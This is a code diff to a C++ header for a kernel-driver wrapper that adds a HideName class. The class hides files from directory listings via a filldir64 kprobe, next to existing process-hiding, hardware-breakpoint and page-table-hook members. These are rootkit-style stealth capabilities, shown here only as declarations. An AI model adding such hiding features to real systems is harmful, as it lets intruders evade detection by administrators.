@@ -119,6 +119,18 @@ public:
         Driver& m_d;
     };
 
+    /* Directory-entry name hider — shares the filldir64 kprobe with HidePid.
+     * Matches exactly on basename (no globbing). Up to 16 slots, ≤63 chars. */
+    class HideName {
+    public:
+        HideName(Driver& d) : m_d(d) {}
+        bool add(const std::string& name);
+        bool remove(const std::string& name);
+        bool clear();
+    private:
+        Driver& m_d;
+    };
+
     Driver();
     ~Driver();
     Driver(const Driver&) = delete;
@@ -143,6 +155,7 @@ public:
     Hwbp hwbp;
     PteHook pteHook;
     HidePid hidePid;
+    HideName hideName;
 
     /* Escape hatch for tests + one-off ioctls that don't have a typed wrapper
      * yet. Returns true iff the ioctl returned >= 0. */
